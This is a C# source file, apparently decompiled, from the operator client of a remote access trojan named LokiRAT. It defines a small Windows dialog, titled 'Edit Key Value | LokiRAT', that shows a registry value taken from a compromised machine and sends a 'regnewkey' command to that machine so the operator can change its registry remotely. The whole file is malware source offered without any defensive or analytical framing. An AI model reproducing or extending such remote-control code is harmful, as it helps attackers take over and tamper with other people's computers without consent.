namespace LokiRAT_Client
{
    using LokiRAT_Server;
    using System;
    using System.ComponentModel;
    using System.Drawing;
    using System.Windows.Forms;

    public class registryEditKey : Form
    {
        private Button button1;
        private IContainer components = null;
        private Label label1;
        private TextBox textBox1;

        public registryEditKey()
        {
            this.InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            main.sendToHost("type=command&command=regnewkey|" + registry.fullpath + "|" + registry.keys[registry.selectedKey, 0] + "|" + this.textBox1.Text);
            base.Close();
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && (this.components != null))
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.label1 = new Label();
            this.textBox1 = new TextBox();
            this.button1 = new Button();
            base.SuspendLayout();
            this.label1.AutoSize = true;
            this.label1.Location = new Point(12, 0x13);
            this.label1.Name = "label1";
            this.label1.Size = new Size(0x3a, 13);
            this.label1.TabIndex = 0;
            this.label1.Text = "Key Value:";
            this.textBox1.Location = new Point(12, 0x23);
            this.textBox1.Name = "textBox1";
            this.textBox1.Size = new Size(280, 20);
            this.textBox1.TabIndex = 1;
            this.button1.Location = new Point(0xc3, 80);
            this.button1.Name = "button1";
            this.button1.Size = new Size(0x61, 0x17);
            this.button1.TabIndex = 2;
            this.button1.Text = "Edit";
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Click += new EventHandler(this.button1_Click);
            base.AutoScaleDimensions = new SizeF(6f, 13f);
            base.AutoScaleMode = AutoScaleMode.Font;
            base.ClientSize = new Size(0x130, 110);
            base.Controls.Add(this.button1);
            base.Controls.Add(this.textBox1);
            base.Controls.Add(this.label1);
            base.FormBorderStyle = FormBorderStyle.FixedDialog;
            base.Name = "registryEditKey";
            this.Text = "Edit Key Value | LokiRAT";
            base.Load += new EventHandler(this.registryEditKey_Load);
            base.ResumeLayout(false);
            base.PerformLayout();
        }

        private void registryEditKey_Load(object sender, EventArgs e)
        {
            this.textBox1.Text = registry.keys[registry.selectedKey, 1];
        }
    }
}

